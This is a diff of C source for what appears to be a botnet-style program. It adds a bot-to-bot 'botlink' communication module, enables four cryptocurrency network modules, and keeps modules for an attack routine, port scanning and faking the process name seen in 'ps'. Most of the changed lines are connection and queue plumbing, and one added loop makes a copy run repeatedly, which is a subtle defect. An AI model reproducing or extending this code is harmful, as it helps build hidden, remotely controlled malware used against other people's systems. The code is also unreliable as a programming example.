@@ -112,6 +112,8 @@ so nodes can use several communication methods, and irc can be used to control
 #include "modules/httpd/httpd.h"
 // fake 'ps' name
 #include "modules/fakename/fakename.h"
+// bot communication
+#include "modules/botlink/botlink.h"
 
 #define MAX(a, b) ((a) > (b) ? ( a) : (b))
 #define MIN(a, b) ((a) < (b) ? ( a) : (b))
@@ -184,8 +186,9 @@ void OutgoingFlush(Connection *cptr) {
                 cptr->ping_ts = cur_time;
             }
             // give it 20 seconds after flushing
-            if ((cur_time - cptr->ping_ts) > 20)
+            if ((cur_time - cptr->ping_ts) > 20) {
                 ConnectionBad(cptr);
+            }
                 
         }
     }
@@ -234,7 +237,6 @@ the module can choose to keep it alive (by reconnecting, etc)
 void ConnectionBad(Connection *cptr) {
     int r = 0;
     
-    printf("marked as bad\n");
     // free buffers..
     QueueFree(&cptr->incoming);
     QueueFree(&cptr->outgoing);
@@ -384,11 +386,12 @@ void ConnectionRead(Connection *cptr) {
     }
     
     // verify we read something.. if not its bad
-    if (read(cptr->fd, buf, size) <= 0) {
+    if (( r  = read(cptr->fd, buf, size)) <= 0) {
         ConnectionBad(cptr);
         return;
+    
     }
-
+    
     if ((newqueue = (Queue *)L_add((LIST **)&cptr->incoming, sizeof(Queue))) == NULL) {
         // error!
         ConnectionBad(cptr);
@@ -396,7 +399,7 @@ void ConnectionRead(Connection *cptr) {
     
     // all is well..
     newqueue->buf = buf;
-    newqueue->size = size;
+    newqueue->size = r;
 }
 
 // handle basic TCP/IP (input/output)
@@ -502,6 +505,17 @@ int RelayAdd(Modules *module, Connection *conn, char *buf, int size) {
     return ret;
 }    
 
+
+void print_hex(char *buf, int size) {
+    int i = 0;
+    
+    for (; i < size; i++) {
+        printf("%02x", (unsigned char)buf[i]);
+    }
+    
+    printf("\n");
+}
+
 // Takes several incoming messages queued and merges them together
 // Just in case our parsing function didnt have enough data, etc..
 // fixes packet fragmentation.. and it could be faster by merging several simultaneously
@@ -513,9 +527,12 @@ int QueueMerge(Queue **queue) {
     char *buf = NULL;
     int size = 0;
     char *ptr = NULL;
+    int i = 0;
     
     // no need to merge anything if theres only a single queues    
-    if ((count = L_count((LIST *)qptr)) < 2) return 0;
+    if ((count = L_count((LIST *)qptr)) < 2) {
+        return 0;
+    }
     
     // i'll start by merging only 1 at a time.. the msg just wont process if its too short..
     // another loop and it should be fine
@@ -526,13 +543,15 @@ int QueueMerge(Queue **queue) {
         // calculate size of both
         size = qptr->size + qptr2->size;
         
-        if ((buf = (char *)malloc(size + 1)) == NULL)
+        if ((buf = (char *)malloc(size + 1)) == NULL) {
             return -1;
-
+        }
+        
+        for (i = 0; i < qptr->size; i++)
         // copy buffer to new memory location        
         memcpy(buf, qptr->buf, qptr->size);
         // copy second buffer behind it
-        memcpy(buf + qptr->size, qptr2, qptr2->size);
+        memcpy(buf + qptr->size, qptr2->buf, qptr2->size);
         
         // remove original buffer and replace..
         qptr->size = size;
@@ -541,6 +560,7 @@ int QueueMerge(Queue **queue) {
         // replace buffer pointer to new
         qptr->buf = buf;
         
+        //print_hex(qptr->buf, qptr->size);
         // remove qptr2 from list.. itll free the buf in l_del()
         L_del((LIST **)queue, (LIST *)qptr2);
     }
@@ -555,20 +575,8 @@ void QueueFree(Queue **qlist) {
 }
 
 bool ASCII_is_endline(unsigned char c) {
-    char ASCII_characters[] = "\r\n"; //\0";
-    //int i = 0;
-    
+    char ASCII_characters[] = "\r\n";
     return (ASCII_characters[0] == c || ASCII_characters[1] == c);
-/*
-    while (ASCII_characters[i] != 0) {
-        if (c == ASCII_characters[i])
-            return 1;
-        
-        i++; 
-    } 
-    
-    return false;
-    */
 }
 
 char *ASCIIcopy(char *src, int size) {
@@ -824,10 +832,10 @@ void ConnectionNew(Connection *cptr) {
 int main(int argc, char *argv[]) {
     int sleep_time = 1500;
     // initialize modules
-    //bitcoin_init(&module_list);
-    //litecoin_init(&module_list);
-    //namecoin_init(&module_list);
-    //peercoin_init(&module_list);
+    bitcoin_init(&module_list);
+    litecoin_init(&module_list);
+    namecoin_init(&module_list);
+    peercoin_init(&module_list);
     // portscan should be before anything using it..
     portscan_init(&module_list);
     // ensure any following modules enable portscans in init
@@ -836,9 +844,11 @@ int main(int argc, char *argv[]) {
     attack_init(&module_list);
     // http servers
     httpd_init(&module_list);
+    // bot link / communications
+    botlink_init(&module_list);
     
     // fake name for 'ps'
-    fakename_init(&module_list, argv);
+    fakename_init(&module_list, argv, argc);
     
     // main loop
     while (1) {
